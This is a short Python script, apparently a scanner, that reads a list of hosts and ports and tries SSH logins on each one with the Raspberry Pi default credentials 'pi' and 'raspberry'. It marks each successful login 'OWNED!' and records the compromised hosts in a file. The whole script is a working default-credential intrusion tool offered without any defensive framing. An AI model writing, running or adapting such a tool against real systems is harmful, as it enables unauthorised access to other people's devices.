import paramiko
import sys

USER = 'pi'
PASS = 'raspberry'
CONN_TIMEOUT = 5

paramiko.util.log_to_file("paramiko.log")

with open('pies.txt') as f:
	for line in f.readlines():
		pi = line.split(',')
		(host, port) = (pi[0], pi[1])

		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		print('trying ' + host + ':' + port + '... '),
		sys.stdout.flush()
		try:
			ssh.connect(host, port=int(port), username=USER, password=PASS, timeout=CONN_TIMEOUT)
			print('OWNED!')
			with open('owned_pies.txt', 'a') as g:
				g.write(host + ':' + port + '\n')
			ssh.close()
		except Exception as e:
			print(e)
			continue
